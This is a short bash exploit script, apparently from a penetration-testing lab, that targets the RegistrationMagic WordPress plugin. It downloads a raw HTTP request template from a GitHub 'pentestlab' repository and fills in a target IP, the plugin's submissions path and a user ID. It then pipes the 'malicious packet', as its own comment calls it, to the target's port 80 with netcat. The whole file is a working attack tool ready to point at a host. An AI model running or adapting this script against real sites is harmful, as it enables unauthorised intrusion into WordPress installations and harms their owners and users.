#!/bin/bash
# Sends malicious packet to the host
if (( $EUID != 0 )); then 
	echo "Run with sudo privileges"
	exit
fi
while getopts "i:u: " option; do
	val=$OPTARG
	case $option in
		i)
			# Sets IP
			ip=$val
		;;
		u)	
			# Sets user_id
			uid=$val
		;;
	esac	
done
if [ -z $ip ] || [ -z $uid ]; then
	echo "Please specify the IP(-i) and user_id(-u)."
	exit 1
fi
# Pull down packet.sh
wget -O packet https://raw.githubusercontent.com/SirSertile/pentestlab/master/RegistrationMagic/packet
# Edit packet.sh with sed or something
sed -i "s/FULLYQUALIFIEDPATH/$ip\/wordpress\/index.php\/rm_submissions\//g" packet
sed -i "s/SERVERHOST/$ip/g" packet
sed -i "s/RMUSERID/$uid/g" packet
# Send a packet
cat packet
cat packet | nc "$ip" 80 -w 2
# See what happens to it 